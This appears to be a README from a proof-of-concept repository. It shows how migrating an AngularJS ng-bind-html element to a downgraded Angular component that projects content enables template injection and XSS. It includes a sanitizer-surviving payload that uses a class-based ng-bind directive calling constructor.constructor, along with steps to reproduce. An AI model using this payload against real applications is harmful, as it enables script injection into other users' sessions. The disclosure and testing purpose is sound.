# Case 3: ng-bind-html with ngSanitize

Same setup as case 1 (AngularJS app with `ng-app` and `downgradeModule()`), but the value is rich text. The ticket
description is HTML written by the customer, and the legacy page renders it with `ng-bind-html`, which sanitizes
it with ngSanitize. The migrated component is a box that only projects its content:

```ts
@Component({
  selector: 'message-box',
  template: `<ng-content></ng-content>`,
  host: {class: 'message-box'},
})
export class MessageBoxComponent {}
```

```diff
- <div class="message-box" ng-bind-html="$ctrl.ticket.description"></div>
+ <message-box ng-bind-html="$ctrl.ticket.description"></message-box>
```

The description has no `{{ }}` at all:

```html
<p>I can't download my invoice.</p>
<span class="ng-bind: constructor.constructor('alert(document.domain)')()"></span>
```

ngSanitize keeps the `class` attribute, so the span goes into the element as sanitized HTML. When the downgraded
component is created, `compileContents()` compiles it, and AngularJS reads `ng-bind: ...` in the class as the
`ngBind` directive (the compiler guide lists `class="ng-bind: exp;"` as one of its forms). Filtering `{{` out of
user input doesn't help here.

## Steps

Start the backend from the repo root (`node backend.mjs`), then:

```
npm install
npm start
```

Open http://localhost:4203/tickets/1042. The alert shows up, and the first paragraph of the description renders as
normal text.

Without the migration (the `<div ng-bind-html>` above) the same description is shown as sanitized HTML and nothing
runs.

## Files

- `src/index.html`: `<body ng-app="supportApp">` with the ticket page, angular.min.js and angular-sanitize.min.js
- `src/main.ts`: the AngularJS module, with ngSanitize, `downgradeModule()` and `downgradeComponent()`
- `src/legacy/ticket-page.component.ts`: the legacy ticket page
- `src/angular/`: the message box component and its NgModule
